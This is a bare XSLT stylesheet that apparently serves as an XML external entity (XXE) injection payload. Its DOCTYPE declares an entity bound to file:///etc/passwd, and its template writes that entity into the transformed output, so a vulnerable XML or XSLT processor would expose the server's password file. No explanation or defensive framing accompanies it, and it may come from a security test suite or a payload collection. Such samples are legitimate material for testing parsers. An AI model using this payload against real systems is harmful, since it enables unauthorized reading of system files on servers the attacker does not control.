<!DOCTYPE xsl:stylesheet [
    <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
    <xsl:template match="/">
        &passwd;
    </xsl:template>
</xsl:stylesheet>
